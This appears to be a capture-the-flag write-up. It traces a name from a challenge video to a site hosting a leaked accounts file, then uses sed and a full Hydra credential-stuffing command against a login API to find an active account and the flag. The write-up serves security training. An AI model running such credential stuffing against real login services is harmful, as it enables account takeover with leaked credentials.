#Challenge 

## Steps to Solve the Challenge

1. **Identifying the Name**:
   - In the challenge video, we saw the name <**stikked**> at the **0:21** timestamp.
![Screenshot 2024-12-19 123732](https://github.com/user-attachments/assets/501d3823-eab3-4557-b233-af7e6ffee0ce)

2. **Finding the Relevant Post**:
   - Searching the latest posts for the name **stikked** led us to a post that linked to their website.
![Screenshot 2024-12-19 123802](https://github.com/user-attachments/assets/6e5741a4-38d6-428f-9e1d-b6ce4d84ced3)

3. **Discovering the Data Leak**:
   - On their website, I navigated to the **Recent** tab and found the accounts file under a section about a data leak.
![Screenshot 2024-12-19 123856](https://github.com/user-attachments/assets/e6ff7b12-3465-4128-9bf5-6e1928500d8b)
  
4. **Editing the Accounts File**:
   - To make the file compatible with Hydra, I replaced `--` with `:` using the following command:

     ```bash
     sed -i 's/ -- /:/g' accounts.txt
     ```
![Screenshot 2024-12-19 124019](https://github.com/user-attachments/assets/cc8d7231-4f0e-47fe-a54a-b55dd10d7776)

5. **Using Hydra to Test Credentials**:
   - I used Hydra to test the accounts with the following command:
     ```bash
     hydra -C accounts.txt cybernt-labs.com -s 443 https-post-form "/api/login:email=^USER^&pass=^PASS^:your account has been disabled" -V
     ```

6. **Finding an Active Account**:
   - Hydra identified one account that was still active.
   
![Screenshot 2024-12-19 124143](https://github.com/user-attachments/assets/b75f0f06-0d47-43e3-973d-efbaf338a3ad)

 7. **Logging In and Finding the Flag**:
   - After logging into the website with the active account, I found the user ID, which turned out to be the flag for the challenge.

![Screenshot 2024-12-19 124219](https://github.com/user-attachments/assets/e8a2ea94-1cb8-4942-8d6d-5d507e09390f)
